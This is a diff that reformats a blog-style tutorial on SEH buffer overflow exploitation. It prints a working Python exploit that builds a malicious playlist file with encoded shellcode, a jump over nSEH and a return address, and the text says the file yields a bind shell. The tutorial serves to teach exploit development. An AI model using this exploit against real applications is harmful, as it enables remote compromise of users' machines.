@@ -29,7 +29,9 @@ tags:
 
 #### What is an exception Handler?
 
-In simple terms, an Exception Handler is exactly as the name implies, it *handles exceptions*, that is to say, when a program reaches something outside it's known functionality, an exception is raised (eg if a program wants an input between 2 and 5, and you put in 6). The program then needs to know how to *handle* this, either with an error message, exit code, or whatever else.
+In simple terms, an Exception Handler is exactly as the name implies, it *handles exceptions*, that is to say, when a program reaches something outside it's known functionality, an exception is raised (eg if a program wants an input between 2 and 5, and you put in 6). 
+
+The program then needs to know how to *handle* this, either with an error message, exit code, or whatever else.
 
 A Structured Exception Handler will follow a structure in  regards to handling exceptions.
 
@@ -120,7 +122,8 @@ So now we need to replace nSEH with opcode that will JMP over the next few bytes
 
 Once this is done some shellcode is generated and placed AFTER SEH but BEFORE the rest of the attack string which should be big enough to overflow the application as below:
 
-```#!/usr/bin/python -w
+```
+#!/usr/bin/python -w
 shellcode="\x90"*10+("\xd9\xc2\xd9\x74\x24\xf4\xba\x75\xad\xc8\xb1\x58\x33\xc9\xb1"
 "\x53\x83\xe8\xfc\x31\x50\x13\x03\x25\xbe\x2a\x44\x39\x28\x28"
 "\xa7\xc1\xa9\x4d\x21\x24\x98\x4d\x55\x2d\x8b\x7d\x1d\x63\x20"
@@ -145,14 +148,16 @@ shellcode="\x90"*10+("\xd9\xc2\xd9\x74\x24\xf4\xba\x75\xad\xc8\xb1\x58\x33\xc9\x
 "\xf9\x32\xe9\x56\x82\x2e\x89\x99\x59\xeb\xb9\xd3\xc3\x5a\x52"
 "\xba\x96\xde\x3f\x3d\x4d\x1c\x46\xbe\x67\xdd\xbd\xde\x02\xd8"
 "\xfa\x58\xff\x90\x93\x0c\xff\x07\x93\x04")
-  
+
 filename="seh.plf"
 #0x6162e557
 buffer = "A"*608 + "\xeb\x10\x90\x90" + "\x57\xe5\x62\x61" + shellcode+ "B"*(1384-len(shellcode))
 textfile = open(filename , 'w')
 textfile.write(buffer)
 textfile.close()
+
 ```
+
 Now we generate our malicious playlist and open it in again - this time immunity does not register a crash, and we are able to connect to the bind shell payload:
 
 ![SEH_exploited](/assets/images/seh/SEH_exploited1.jpg)
